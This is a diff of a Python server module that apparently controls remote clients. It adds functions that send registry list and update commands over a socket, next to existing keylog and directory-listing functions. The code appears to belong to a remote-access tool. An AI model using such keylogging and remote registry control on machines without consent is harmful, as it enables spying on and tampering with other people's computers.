@@ -181,11 +181,35 @@ def keylog(ip_address, time):
         print(data) # Debug
     action_dictionary[ip_address].put(action_message)
 
-def registry_list(ip_address, path_to_folder):
-    pass
+def registry_list(ip_address, full_path):
+    def action_message(conn):
+        conn.sendall(bytes("REGISTRY", "utf8"))
+        conn.sendall(bytes("LIST ", "utf8"))
+        conn.sendall(bytes(full_path, "utf8"))
+        # receive all data from the client
+        size_to_recv = int(conn.recv(BUFSIZ).decode('utf8'))
+        data_to_recv = b''
+        for idx in range(0, size_to_recv, BUFSIZ):
+            r = conn.recv(BUFSIZ)
+            data_to_recv += r
+        data_to_recv = data_to_recv[:size_to_recv] 
+        print(data_to_recv)
+    action_dictionary[ip_address].put(action_message)
+        
+        # print(data) 
 
-def registry_update(ip_address, absolute_path, value):
-    pass
+def registry_update(ip_address, absolute_path, value, data_type):
+    def action_message(conn):
+        conn.sendall(bytes("REGISTRY", "utf8"))
+        conn.sendall(bytes("UPDATE ", "utf8"))
+        conn.sendall(bytes(absolute_path, "utf8"))
+        conn.sendall(bytes(" ", "utf8"))
+        conn.sendall(bytes(value, "utf8"))
+        conn.sendall(bytes(" ", "utf8"))
+        conn.sendall(bytes(data_type, "utf8"))
+        ack = conn.recv(BUFSIZ).decode('utf8')
+        print(ack)
+    action_dictionary[ip_address].put(action_message)
 
 def dir_list(ip_address, path_to_folder):
     action_message = lambda conn: directory_tree_server.dir_list(conn, path_to_folder)
